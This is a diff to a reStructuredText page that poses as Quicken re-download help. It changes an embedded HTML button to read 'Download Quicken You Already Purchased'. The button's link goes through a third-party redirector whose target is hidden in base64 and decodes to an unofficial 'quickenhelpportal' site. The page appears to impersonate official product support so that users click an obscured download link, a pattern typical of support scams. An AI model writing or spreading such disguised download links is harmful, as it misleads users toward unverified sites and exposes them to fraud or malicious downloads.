@@ -136,11 +136,12 @@ Yes, you can reinstall **Quicken** anytime:
 -------------
 Downloading **Quicken** you’ve already purchased is simple when you follow these steps. Whether you're on **Windows 11**, **a new computer**, in **Canada**, or resolving **Quicken download issues**, just make sure you:
 
-    .. raw:: html
 
-    <div style="text-align:center; margin:20px 0;">
-        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuaGVscHBvcnRhbC5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3Q=" target="_blank" style="background-color:#26a69a; color:white; padding:14px 26px; font-size:17px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 0 10px rgba(0,0,0,0.2);">
-            Get Help
+.. raw:: html
+
+    <div style="text-align:center; margin-top:25px; margin-bottom:40px;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuaGVscHBvcnRhbC5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3Q=" target="_blank" style="background-color:#ff9800; color:white; padding:14px 30px; font-size:18px; font-weight:bold; border-radius:8px; text-decoration:none; box-shadow:0 0 12px rgba(255,152,0,0.5);">
+            Download Quicken You Already Purchased
         </a>
     </div>
 
